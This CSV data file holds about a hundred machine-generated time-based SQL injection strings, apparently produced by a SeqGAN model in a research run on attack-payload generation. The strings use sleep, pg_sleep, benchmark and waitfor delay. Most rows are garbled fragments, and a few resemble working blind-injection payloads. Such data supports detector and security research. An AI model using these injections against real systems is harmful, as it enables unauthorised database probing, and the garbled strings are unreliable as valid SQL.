label,payload,family,payload_type,method,run_id,sample_index
attack,"1"" or 8514  =  benchmark  (  5000000,md5  (  select from sleep  (  5   )    )     )fs do  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,229
attack,"1"" and where 8514  =  (  select 4240 from from from   (  =  6272  =sleep  (  5   )    s kvke  7305 or 4240  =  5000000,md5  0x4c4d6142   )    r)     )    and   (  select * from   (  5=  #(  select from   (  select or sleep  6272sleep  (  6272 6969 from from 6969  (  =  1210,sleep  (  5   )    and    (     (  select * from   ( * sleep  (  5   )    (  select 4240 from ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,230
attack,1'  )   waitfor delay '0:0:5' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'z'  =  'zoin'  =  'f'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,231
attack,  select 6793 from   (  select  (  0x544d5a4c   )    )     )   and   (  select from pg_sleep  (  5   (  select 4240 from    (  'hrta'  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,232
attack,"1""    )    )   where pg_sleep  0x4c4d6142   )     )   where 6969 from pg_sleepmq  )   (  select    )     )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,233
attack,"select benchmark  (  (  5   )    )     )   )         (  ""%""  =    (     (  select    (  select 6793 from 4240 sleep  # like  =    (  ""wucy""    0x544d5a4c   and 2388 benchmark  benchmark  (    (  5   )    (  select from or sleep  (  )srmq  )  sddk)    )    and   (  select 8514  =  8507 rlike from   (  sleep  (  select 6969 from from   'rnzp'  =  select from 9008 sleep  (    (  (  5   )    and   6272",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,234
attack,"1 where '0:0:2' pg_sleep  (  select 6793 from pg_sleep  (  sleep   4240 from pg_sleep  0x694a4745(  select or sleep  (  '%'  select 3824  =  from   (  5   )    )    rlike   5874  =  1210  1210,sleep  (  sleep or sleep  (  5   )     )   and    (     (  select * from   )    (  select 4240 2841 fromor pg_sleep  (  5000000,md5  (  0x544d5a4c   )    )     r 8594 from   k  6866  )fs elt  (    (  (  1210  (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,235
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chn'  =  'vt  )   where 7021  =  (  =  9649 and from   (  select  (  5   )sdq  )    (  )  )   and    (    (  0x4c4d6142   and    (    (  select delay 4240 from '0:0:5' select benchmark  (  sleep  (  =  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,236
attack,1'  )   waitfor delay '05p  =  benchmark  (  1210 not  (  5   )     )   'wyvx'  =  rvtf  )  sduq  )   (     (  select from or pg_sleep  (  6866,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,237
attack,1'  )   waitfor delay '0:0:5   )    and       (  (  select 8594 from pg_sleep  (  0x544d5a4c   (  select 8594 from 8514  5  )r  (    (fvkfhrrau,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,238
attack,"1""  )   rlike   (  select 4240 from pg_sleep  (  5   )and pg_sleep  select 6969 from from   (  select  (  5   )      8514  =  1210,sleep  (  5   )    )     )  '%'  =    (     (  0x544d5a4c   <> 1568  =    (    )    and    (     (  select * from from from   (  =  1210  sleep  (  5   )    )     )smdo  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,239
attack,"select benchmark  (  5   )    )     )uvw""zlal""_ke   (  select from from   (  5   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,240
attack,select sleep     (  0x544d5a4c   )     )   and    (  select * from   (  select  (  5   )     )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,241
attack,1'  )   and   (     (  select sleep  (  5#,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,242
attack,1   )     )   -- 2388  =  benchmark or sleep  (  select  (  5   )     )fs ydpq  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,243
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zhhwjyq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,244
attack,"1'  )   waitfor delay '0:0:5')   and   (  select 6793 from  (  5   )    (yq  )    )    (    select 6969 from where from   (  select   (  select sleep  (  0x544d5a4c   (  5   and    (    (     (  ""zlal""  1132 rldmdo  )(    (     )  stdk  (  =    (  select 4240 from pg_sleep  (  5   )    )     )    )      6793  =    (     (  ""wucy"" e 8514  =  benchmark   from pg_sleep  (  5   )     )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,245
attack,pe from   (ye(  7279 )   5874  select from pg_sleep  0x544d5a4c   (  0x544d5a4c   )    (vqw    #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,246
attack,"1"" where (  =  6272,sleep  (  5r)   and     (  select 6969 '0:0:5'--",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,247
attack,select       4240 from pg_sleep  (  select 4240 from '0:0:2' from from   (  =  0x544d5a4c   )    )     )   and and    (     (  select * from   (  5   )    (  select 4240 from from 4240  (  0x76555642  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,248
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'rf'  =  '  )   or 8514  =  benchmark  (  5   )    )     )     )sleepand delay pg_sleep  (  0x544d5a4c   )    )    and    (     (  select 4240 from pg_sleep 6793 sleep  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,249
attack,select benchmark  (  0x694a4745   )     )   (  select * from   (  selectr 6793 from   (  select  (  sleep  (  1210(  5  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,250
attack,"u1915select ""  (  5   (  select * from   =  5   )      #)   )    )     )  -- xk'sa' from from   (  0x694a4745   )     )   )    )    and    (d5  select 4240 4240  =    and 8594  =    (  select * 1132  =  7305 or 4240  =  ""uvzc"" like from pg_sleep  6866 rmq  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,251
attack,1 where 2239  =    (  (    (     (  select * from from from        (   'rnzp'  =  mdd  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,252
attack,"  select 4240 from from pg_sleep  (  5   )    )     )    )   and    (     (    (     (  select 4240 6383 from pg_sleep  (  select from pg_sleep  (  5   )    (  )   and    (     5000000,md5  (  0x694a4745   )    )    (  sleep  select 8514 from pg_sleep * from   (  select  (  sleep  (  5   )     )    (  ""zcr)  eu 3824  =    (     (  0x6d457153   'rnzp'  =  8485 8594  ydo  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,253
attack,"select   (  5   and    (     (     (  ""wucy"" 6969 q  6383mq  )     )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,254
attack,mdd'  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,255
attack, select )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,256
attack,"'  =  '  s       (    (  select 4240 from pg_sleep  (  5000000,md  =  =  (  =  1210,sleep  (  sleep  (  (  =  (  =  (  0x76555642   )     )  sdd pg_sleep  (     (  select 4240 from pg_sleep  (  5  )     )     )  srmqcyvqpu  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,257
attack,select    (  '%'  =    (     (  select 4240 from from pg_sleep  (    select  (  5   and    (    nzcru,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,258
attack,"select sleep  (  select 6793 from pg_sleep  (  5rr)   and     (  select or 6793  =  select from pg_sleep  (  5   )     )   )     )   and    (     (  select 4240   benchmark  6272,sleep  (  5000000,md5  (  0x544d5a4c   )    )     )   )    vw  select sleep  ( or 3824  =  benchmark  (  7196  (  5   )    s k  =    and       (  ""%""  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,259
attack,1'  )   and    (    (    (    (  0x544d5a4c   )    and    (    (  'hrta'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,260
attack,select    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,261
attack,"1    (  select '0:0:5' 8594 from from 8466  =  benchmark  (  5000000,md5  (  5000000  (  =  6272,sleep  (  5   )     #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,262
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%ofinh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,263
attack,1   )    )      3824 8485  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,264
attack,1   )    )   -- emd5(  5   )    and    (    (     (  select 6793 from 6969 from   (  select  (  5   )    )    )    (  8507 ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,265
attack,1 or 4240  =    (  select    (  =    (  0x4c4d6142   )     )  # where 7196 5  (  6272  =  9649 or    (  select sleep  (  5   )    )     )   #  select 8594  =    (  1915  =    (  select * from   (  select  (  0x694a4745  sdd  =  select and 6793  =  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,266
attack,6272select where   0x76555642   -- dky,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,267
attack,   (  select 4240 # from pg_sleep  (  5  )rmq  )    )     )  rldomq  )  r     (    )     )   and    (     ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,268
attack,"select "" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and "" from not  select 4240 from 8252  5   )    and    (   (  0x4c4d6142   <> e from 6793  =    (     5000000,md5(  select pg_sleep  (  (  benchmark  (  sleep  (  5000000,md5  (  1210select ( 6793 from pg_sleep  (  5   )    )     )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,269
attack,"1 and 4240  =    (  select * from   (  5000000,md5  (  select 6969 from,sleep   (fyvqwp rt",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,270
attack, 'yfvu' 6969 '0:0:5' --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,271
attack, 4240 from and   (  select 6969 from   (  select  (  5   )    )     )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,272
attack,select benchmark  (  5   )    (     (  0x544d5a4c   )    )     )   and    (    (   )    and   (    )     )sdo  ) or pg_sleep    7196  )  sddiqrusw,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,273
attack,1%r   )    and el* from from   (  0x544d5a4c  s=dd5      (fy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,274
attack,=   #viy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,275
attack, where from pg_sleep  (  5    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,276
attack,ckkf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,277
attack,"select   (  5000000,md5  (  sleep  (  5   )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,278
attack,"select 6793   9649 (f  ""wucy"" pg_sleep  select 6793 from pg_sleep  (  5   )    )     )   )     )   and    (    (   'wyvx'  =    (     (  0x76555642   (  select 6969 from from pg_sleep  (  5   )    )   -- qvwycrruc",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,279
attack,1'rrlike   (  select sleep  (  5   'yfvu' 8514  =  1679 or sleep  (  select from   (  =  benchmark  (  sleep  (  5   )    )     )    )     )     )   and    (     (  '%'  =    (     (    (  select 6793 from '0:0:5'--o  gpq  =    (  select * from   (  sleep  (  5   )    aswkq  )  -- ddo  )rmq  sreu 4240,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,280
attack,"1 or 6793  =    (  select and   8594  =    (  y  (  select 4240 from pg_sleep  (  5   (     ""%""  =  6866",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,281
attack, '%'  0x76555642   )     )  srmq  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,282
attack,"1%"" or elt  (  0x765556428514 6969  =    and   (  '%'  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,283
attack,"1   )    )   (    (    (     (  'hrta'  =  1915 do  ),mq  1210,md5  select from   (  select  (   (  0x76555642   -- k  =    (   2388  (  5    )    (  select * from from   (  0x544d5a4c   )    #z  select 6793 from from   (  select  (  5   )    )     )  s foe  (  7021 or 8514  (  =  benchmark  (  =  0x76555642   and    (    (   'wyvx'  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,284
attack,1 where 4683  =  1915  6272(  =    (  '%'    (  )  )     )     )  sddkv,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,285
attack," select 6969 from 6969  =    (     (  select 6969 '0:0:5' from e and    ( ""wucy"" 4240  =  2044 from pg_sleep  (  5   )    )    as ke   (  select * from   (  5  sddmvpbmq  )  # like where 3114  =  7305 or 3824  =  5   )    )    and    (     (    (    (  select 4240  =  8667   (  )  ru",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,286
attack,"1'   and    (    (     (  select 4240 from pg_sleep  (  0x544d5a4c   )(  select * from fromdsleep  (  5   )     )   )     (  )  ste from 3824  =  ""  (  5   )    a#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,287
attack,"1"" pg_sleep  (  select 4240 from pg_sleep  (  5   )      sducr)  )   (    (  =    (  ""uvzc"" 'yfvu' 4240 '0:0:5'wq 8594 from where 3824  =  2841  (  9008  (  5   )    and   (  select 6793 from d from pg_sleep  (  0x76555642   )    )     )#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,288
attack,select 7021 from pg_sleep  (  sleep  (  5   )    )     )and,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,289
attack,"select    )    rw   )    )   and like "" d5  (  select 8594 from pg_sleep  (  5   )     )   # jpe  (  5000000,md5  (  (  0x76555642   and    (     )  s 2239  =    (     0x544d5a4c   )    )    )     )     )   (  )   -- elt  (  0x4c4d6142   p  e   (  select * from   (  5   select 8466  =  9649 benchmark from from 4240 from   (  5  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,290
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""j0:sleep  (  0x694a4745   )    )     )  <> ke   (     (  select 4240 from from from   (  5    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,291
attack,1'  )   waitfor delay '0:0:sleep  (  1210  benchmark  (  5   )    )     )  s 8252 r  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,292
attack,c  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,293
attack,"select sleep  (  5   )    )   where '0:0:5' 'fegp'  =    (  select * from   (  0x544d5a4c   iq  )  fromwyq rlbmke6175  )   and    (    (    (  ""uvzc"" elt  (  5   )    (  8507u)  select 4240 k    (  select from pg_sleep  (  5   )    )     )   (  select 4240 from pg_sleep  (  5000000,md5  (  sleep  (  (  5   )    )     )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,294
attack,"1%"" or  (  =        (  select 6793  (  6272,,sleep  (  0x76555642   (  select 8594 from from pg_sleep  (  5   )     )  )     asdq  )  -- ke and sleep  (  5   )     )   or)   where delay from from      (  select  =  5   <> 7021  =  select from pg_sleep(  5   and    (    (    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,295
attack,"1'   )    and   (  select from pg_sleep  (  5000000,md  =  0x4c4d6142   )    (  )   and    (    (     (  select 6969 from from sleep  (  0x544d5a4c   )    vwke(     (  select    (  select 4240  =  (  6175 or 4240  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,296
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'l,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,297
attack,"1"" or 8466  =  benchmark  (  sleep  (  sleep  (  5   (vt  =    (     (  select * from   (  0x76555642   sddo  =    (  select (  0x76555642   # like ' --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,298
attack,n'  =  'cf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,299
attack,select 3824  6272 from   (  sleep  (  5   )     ),time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,300
attack,"1  )   and(  ""%""  =    (k'rnzp'  =    (  (dd:  select 6969 k  )   (  'fegp'  7196 '0:0:5'--",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,301
attack,"h)   )   and    (    u where ,md5  (  5000000,md5  (  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,302
attack,select sleep  (  select 4240 from or sleep  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,303
attack,1  )   where '0:0:2' #zc,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,304
attack,"1 or elt  (  =  benchmark  (   from pg_sleep  (  5   )     4240 5874o   -- like from or 8466  =  5000000,md5  (  select  (  5 r  (  select 6793 from       )   where delay 3824  =  6272,sleep  (  5   )     )     )    nzp",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,305
attack,"select sleep  (  5   )     8514  =  =  9649 and 8594select  (  5000000,md5  (  5   )     )",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,306
attack," 3824  =  benchmark  (  5   )    and    (  '%'  =    and   'hrta'  =    (   'wyvx' ""tu and 8466  =  =  1210 or from   (  select sleep  (  5000000,md5  (  5   )     )   and    (     (  select delay '0:0:5' #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,307
attack,"select yd5 6793 from 8507 rtuuselect where from 8594 from 8252 waitfor from   (    sleep  5   )    )   and    (   5874  =    (  ""zlal""  =  1210,sleep  (  7196 or 8514  5000000,md5  (  )  st,md5  (  0x76555642   )     select * from   (  select sleep  (  sleep  (  (  5   )     )rrv",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,308
attack,"1%"" or elt  (  0x76555642   'fegp'k  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,309
attack,"1"" and 8514  =  7279 and sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,310
attack,"select or 4240 """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,311
attack,v'  =  'pbin,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,312
attack,"1'  )   as dqlikelt  (  1210,sleep  (  5   )    )     ),pg_sleep  (  select 6793 from from ' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '  =  benchmark  (  5   )    r 8594  =       (  )    and 2388  =  benchmark  (  5   )    and    (estrruz",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,313
attack,"1"" where 4240  =  (  select  (  5   )     )  sdd 8507  =    and   (  select or 6793  =     sleepu r rmq  )errg)  select * from from   (  select  (  5000000,md  1210  =  (  =  0x544d5a4c   and 6969  (  =    (aru)  sd",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,314
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""cmpa",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,315
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""ch    where 1132  =  (  =  (  =  ' or from   (  select  (  sleep  (  5000000,mebenchmark  (  =  6272  7196 pg_sleep  (  (  5   )    )    )     )   # select 3824 from and from   (  ""wucy"" e 6793    (  select  (  5  )   and     (    (    (     (  select 4240 from   (  select (  0x4c4d6142   )     )  sddoesdkkd5  (  select 4240 from pg_sleep  (  5   )    )    )   -- q ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,316
attack,select pg_sleep  (  0x4c4d6142   )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,317
attack,1'   )    as dq where 8485  =  (  =  7196 or sleep  (  sleep  (  5   )    )     )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,318
attack,"1%""   pg_sleep  (  5   )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,319
attack," 1915 ""f",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,320
attack,"select sleep  (  0x544d5a4c   )    and   (  select 6793 from pg_sleep   (  select or 8466  =  3672  4240  (  5000000,md5  (  5  )s do  )    )     )   'rnzp'  =  1915",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,321
attack,select benchmark  (  5   )     )   (  select 6969 sdd5  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,322
attack,vi'  =  '     c,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,323
attack,1 or   (    (  select 4240 from   (  5  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,324
attack,"select benchmark  (  5000000,md5  (  sleep     (  5  )    (  select * from   (  select  (  5   )     )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,325
attack,"select sleep  (  5  )   and 6793  =    (   where 8252  =,sleep  5000000,md1  sleep   and 8514  =  benchmark  (  5   )     )  <> kwaitfor '0:0:2' s dmqst W 6969 from or elt  (  0x76555642   )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,326
attack,"1 where 8507  select from pg_sleep  (  5   )    )     )    and   and    (     5  )   (  ""uvzc"" like --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,327
attack,"waitfor (  5000000,md5  (  sleep  (  5   )     )    (     select  (  0x544d5a4c   )    )     )   where delay from   (  select 4240 from and   (  select (  sleep  (  5   (  select 4240 from from '0:0:2' from 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )     )     )  )    and    (   'wyvx'benchmark  q and where from   (  select  (  select pg_sleep  5   )    )     )   where '0:0:2' #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,328
attack,"0x4c4d6142   (  select 4240 from '0:0:5' from   (     5000000,md5  (  =  benchmark  st  )  # where 8507  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,329
attack," 'yfvu' 8514 7196  =  (  5000000,md5  (  select * from   (  5000000,md5  (  5000000,ie   (  select 4240 from pg_sleep  (  5  )  # or elt  (  6383 or 3824  =  1132 sleep  )   (  ""uvzc"" likeo  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,330
attack,1 where delay from from from from   (  select  (  0x544d5a4c8514  =  (  =  1210  5   )    rw 4240  6866,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,331
attack,"select sleep  (  select or sleep  6272,sleep  ( * from pg_sleep  (  5   )     )   (  0x4c4d6142   )    )    )     )   (  select from from pg_sleep  (  sleep  )   (  5   )    )    )     )  )ras iq  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,332
attack, 5  sdq where ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,333
